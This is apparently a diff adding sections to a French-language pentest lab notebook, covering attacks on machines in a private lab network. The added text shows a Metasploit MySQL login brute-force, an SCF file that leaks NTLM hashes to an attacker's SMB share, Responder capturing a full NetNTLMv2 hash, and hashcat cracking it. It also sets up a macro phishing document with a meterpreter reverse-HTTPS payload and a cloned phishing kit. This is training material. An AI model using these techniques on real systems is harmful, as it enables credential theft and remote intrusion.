@@ -708,7 +708,7 @@ RHOSTS => 192.168.10.20
 ```
 ```
 back
-services 192.168.10.20 -c name,info
+services 192.168.10.20 -c name,info -S http
 ```
 ```
 Services
@@ -743,4 +743,131 @@ host           name          info
 192.168.10.20
 192.168.10.20
 ```
+```
+use auxiliary/scanner/mysql/mysql_login
+set USERNAME root
+set BLANK_PASSWORDS true
+```
+```
+
+[+] 192.168.10.20:3306    - 192.168.10.20:3306 - Found remote MySQL version 5.0.51a
+[-] 192.168.10.20:3306    - 192.168.10.20:3306 - LOGIN FAILED: root:mfsadmin (Unable to Connect: invalid packet: scramble_length(0) != length of scramble(21))
+[-] 192.168.10.20:3306    - 192.168.10.20:3306 - LOGIN FAILED: root: (Unable to Connect: invalid packet: scramble_length(0) != length of scramble(21))
+[*] Scanned 1 of 2 hosts (50% complete)
+[-] 192.168.10.30:3306    - 192.168.10.30:3306 - Unable to connect: The connection was refused by the remote host (192.168.10.30:3306).
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Bruteforce completed, 1 credential was successful.
+[*] You can open an MySQL session with these credentials and CreateSession set to true
+[*] Auxiliary module execution completed
+```
+Aucun cred trouvé pour `root` ni `msfadmin` essayé juste après. 
+
+### Windows SCF
+
+```title="exploit.scf" linenums="1"
+[Shell]
+IconFile=\\192.168.10.10\icon
+```
+```
+python2 -m SimpleHTTPServer 8000 
+```
+
+Une fois le serveur lancé, on se connecte sur [http://192.168.10.10:8000](http://192.168.10.10:8000) depuis Windows et on télécharge le fichier dans un dossier créé pour l'occasion. 
+On lance ensuite responder et on ouvre le dossier sur Windows:
+
+```
+responder -I eth0
+```
+```
+[SMB] NTLMv2-SSP Client   : 192.168.10.30
+[SMB] NTLMv2-SSP Username : WIN-126H0VCFVDU\Tim
+[SMB] NTLMv2-SSP Hash     : Tim::WIN-126H0VCFVDU:cb65fa760fe5fbef:0BA80200219C222FD5A3736BBF35ABF9:010100000000000080821379F7BFDA01E344449ED117476E00000000020008004D0044003300340001001E00570049004E002D00430053004B004600330047003300430030004F00480004003400570049004E002D00430053004B004600330047003300430030004F0048002E004D004400330034002E004C004F00430041004C00030014004D004400330034002E004C004F00430041004C00050014004D004400330034002E004C004F00430041004C000700080080821379F7BFDA01060004000200000008003000300000000000000001000000002000006685159A839C2ACC22F35F70AB9B65F96931EAE7C5A35BC142137E0BE8F8F4190A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310030002E0031003000000000000000000000000000                                                                                                     
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
+```
+```title="HashWindows" linenums="1"
+Tim::WIN-126H0VCFVDU:cb65fa760fe5fbef:0BA80200219C222FD5A3736BBF35ABF9:010100000000000080821379F7BFDA01E344449ED117476E00000000020008004D0044003300340001001E00570049004E002D00430053004B004600330047003300430030004F00480004003400570049004E002D00430053004B004600330047003300430030004F0048002E004D004400330034002E004C004F00430041004C00030014004D004400330034002E004C004F00430041004C00050014004D004400330034002E004C004F00430041004C000700080080821379F7BFDA01060004000200000008003000300000000000000001000000002000006685159A839C2ACC22F35F70AB9B65F96931EAE7C5A35BC142137E0BE8F8F4190A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310030002E0031003000000000000000000000000000
+```
+
+Pour Hashcat, j'utilise le [dictionnaire de Karmaz95](https://github.com/Karmaz95/crimson_cracking/tree/main).
+Je suis son README pour l'utiliser. 
+
+
+```
+hashcat HashWindows Downloads/crimson_cracking.txt -r Downloads/crimson_cracking.rule 
+```
+
+!!! failure "Pas assez de mémoire"
+    J'alloue plus de mémoire a la machine.
+
+```
+Dictionary cache built:
+* Filename..: Downloads/crimson_cracking.txt
+* Passwords.: 1868722583
+* Bytes.....: 20980904698
+* Keyspace..: 147502010684560
+* Runtime...: 1 min, 34 secs
+
+TIM::WIN-126H0VCFVDU:cb65fa760fe5fbef:0ba80200219c222fd5a3736bbf35abf9:010100000000000080821379f7bfda01e344449ed117476e00000000020008004d0044003300340001001e00570049004e002d00430053004b004600330047003300430030004f00480004003400570049004e002d00430053004b004600330047003300430030004f0048002e004d004400330034002e004c004f00430041004c00030014004d004400330034002e004c004f00430041004c00050014004d004400330034002e004c004f00430041004c000700080080821379f7bfda01060004000200000008003000300000000000000001000000002000006685159a839c2acc22f35f70ab9b65f96931eae7c5a35bc142137e0be8f8f4190a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310030002e0031003000000000000000000000000000:1234
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: TIM::WIN-126H0VCFVDU:cb65fa760fe5fbef:0ba80200219c2...000000
+Time.Started.....: Sun Jun 16 15:29:43 2024 (0 secs)
+Time.Estimated...: Sun Jun 16 15:29:43 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (Downloads/crimson_cracking.txt)
+Guess.Mod........: Rules (crimson_cracking.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   553.8 kH/s (8.14ms) @ Accel:48 Loops:64 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 24576/147502010684560 (0.00%)
+Rejected.........: 0/24576 (0.00%)
+Restore.Point....: 0/1868722580 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-64 Iteration:0-64
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> ^*bond007
+Hardware.Mon.#1..: Util: 13%
+```
+
+Le mot de passe a bien été craqué. 
+
+### Social engineering
+
+```
+msfconsole
+use exploit/multi/fileformat/office_word_macro 
+set payload windows/meterpreter/reverse_https
+```
+```
+mkdir phisherman
+cd phisherman
+git clone https://github.com/FDX100/Phisher-man.git
+python3 app.py
+```
+
+Une fois l'interface web chargée, on suit les instructions du README: 
+
+- "Clear Apache"
+- "Start Apache Service"
+
+Malhereusement, chaque choix qu'on peut sélectionner nous renvoie une 404  et la page web est redirigée vers un output de logs vide (voir captures ci-après). 
+
+
 
